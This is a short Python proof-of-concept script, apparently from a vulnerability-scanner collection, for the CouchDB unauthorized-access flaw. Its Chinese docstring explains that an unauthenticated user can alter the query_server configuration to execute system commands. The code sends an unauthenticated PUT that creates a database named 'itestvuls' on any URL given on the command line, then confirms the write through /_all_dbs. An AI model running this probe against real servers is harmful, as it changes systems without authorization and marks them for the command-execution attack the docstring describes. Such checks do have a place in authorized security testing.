#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: CouchDB 未授权漏洞
referer: https://www.cnblogs.com/xiaozi/p/8279983.html
author: Lucifer
description: CouchDB允许通过自身提供的Restful API接口动态修改配置属性。
            结合以上两点，我们可以通过一个未授权访问的CouchDB，通过修改其query_server配置，来执行系统命令。
'''
import sys
import requests


class couchdb_unauth_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/itestvuls"
        vulnurl = self.url + payload
        try:
            req = requests.put(vulnurl)
            vulnurl = self.url + "/_all_dbs"
            req2 = requests.get(vulnurl, headers=headers, timeout=6, verify=False)
            if r"itestvuls" in req2.text:
                return "[+]存在CouchDB 未授权漏洞...(高危)\tpayload: "+vulnurl+"\t创建数据库itestvuls"
            else:
                return "[-]no vuln"
        except Exception as e:
            print(e)
            return "[-] ======>连接超时"

if __name__ == "__main__":
    testVuln = couchdb_unauth_BaseVerify(sys.argv[1])
    testVuln.run()
